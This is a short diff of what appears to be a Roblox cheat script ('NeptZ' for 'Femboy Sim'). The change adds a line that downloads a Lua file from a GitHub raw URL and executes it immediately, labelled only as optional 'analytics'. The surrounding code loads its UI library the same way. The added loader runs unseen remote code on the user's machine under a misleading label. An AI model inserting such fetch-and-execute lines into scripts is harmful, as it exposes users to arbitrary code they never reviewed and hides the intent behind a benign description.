@@ -147,6 +147,9 @@ end
 coroutine.wrap(YQZUQ_fake_script)()
 repeat task.wait() until _G.accept
 
+-- remove if no like analytics
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fuckg1thub/NeptX/refs/heads/main/NeptZ/Forsaken/test.lua"))()
+
 -- // UI Setup \\
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/fuckg1thub/assets/refs/heads/main/lib.lua"))()
 local window = library.Window("NeptZ", "Femboy Sim")
